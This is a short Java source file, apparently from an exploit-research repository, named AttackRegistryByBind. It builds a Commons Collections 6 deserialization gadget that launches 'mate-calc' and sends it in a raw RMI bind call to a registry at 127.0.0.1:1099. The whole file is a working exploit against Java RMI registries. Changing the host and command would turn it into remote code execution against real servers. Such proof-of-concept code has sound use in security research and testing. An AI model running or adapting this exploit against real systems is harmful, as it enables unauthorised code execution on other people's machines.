package xyz.eki.marshalexp.rmi.attack;

import xyz.eki.marshalexp.poc.CC6;
import xyz.eki.marshalexp.rmi.utils.RemoteUtils;
import xyz.eki.marshalexp.rmi.utils.ReflectUtils;

import java.rmi.server.ObjID;

public class AttackRegistryByBind {
    public static void main(String[] args) throws Exception {
        try {
            ReflectUtils.enableCustomRMIClassLoader();
            Object payloadObj = new CC6().getPocObject("mate-calc");

            ObjID objID_ = new ObjID(0);

            //Bind("test",payloadObj)
            RemoteUtils.sendRawCall("127.0.0.1",1099,objID_,0,4905912898345647071L,"test",payloadObj);
        }catch (Throwable t){
            t.printStackTrace();
        }
    }
}
